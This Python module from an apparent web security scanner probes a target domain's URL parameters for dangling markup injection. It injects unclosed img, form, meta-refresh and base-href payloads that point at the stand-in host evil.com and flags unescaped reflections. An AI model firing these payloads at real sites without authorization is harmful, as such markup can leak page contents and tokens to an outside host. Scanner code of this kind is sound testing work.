"""
modules/dangling_markup.py
--------------------------
Dangling Markup Injection detection.
Tests if unfiltered HTML context allows exfiltration via unclosed
tag attributes (img src, form action, meta refresh).
"""

from typing import List, Dict, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from core.logger import get_logger, info, ok, warn
from core.utils import safe_request, write_lines
from modules._common import load_urls, module_dir, save_finding, cli_main

log = get_logger("dangling_markup")


PAYLOADS = [
    "<img src='//evil.com?x=",
    "<form action='//evil.com?x=",
    "<meta http-equiv='refresh' content='0;url=//evil.com?x=",
    "<base href='//evil.com/'>",
]


def test_url(url: str) -> List[Dict]:
    findings: List[Dict] = []
    p = urlparse(url)
    qs = parse_qs(p.query)
    if not qs:
        return []

    for param in qs:
        for payload in PAYLOADS:
            try:
                new_qs = dict(qs)
                new_qs[param] = [qs[param][0] + payload]
                new_url = urlunparse((p.scheme, p.netloc, p.path,
                                      p.params, urlencode(new_qs, doseq=True), ""))
            except Exception:
                continue
            r = safe_request(new_url, timeout=10)
            if not r:
                continue
            text = r.text or ""
            # Look for payload reflected in HTML context (not escaped)
            if payload in text and "&lt;" not in text[text.find(payload)-10:text.find(payload)]:
                findings.append({
                    "type": "dangling_markup",
                    "url": new_url,
                    "param": param,
                    "payload": payload,
                    "evidence": "Payload reflected unescaped in HTML",
                    "severity": "high",
                    "confidence": 65,
                })
                break
    return findings


def run(domain: str, output_root: str = "results",
        scan_id: Optional[int] = None) -> Dict:
    mdir = module_dir(domain, "dangling_markup", output_root)
    urls = load_urls(domain, output_root)
    params_urls = [u for u in urls if "?" in u and "=" in u]

    info(f"Testing {len(params_urls[:60])} URLs for dangling markup")
    findings: List[Dict] = []

    for url in params_urls[:60]:
        try:
            for f in test_url(url):
                findings.append(f)
                save_finding(domain, "dangling_markup", f["type"], f["severity"],
                             f["url"], param=f["param"], payload=f["payload"],
                             evidence=f["evidence"], confidence=f["confidence"],
                             scan_id=scan_id, output_root=output_root)
        except Exception as e:
            log.debug(f"dangling markup failed {url}: {e}")

    return {"count": len(findings), "findings": findings}


if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument("-t", "--target", required=True)
    p.add_argument("-o", "--output", default="results")
    args = p.parse_args()
    cli_main(args.target, "dangling_markup", run, args.output)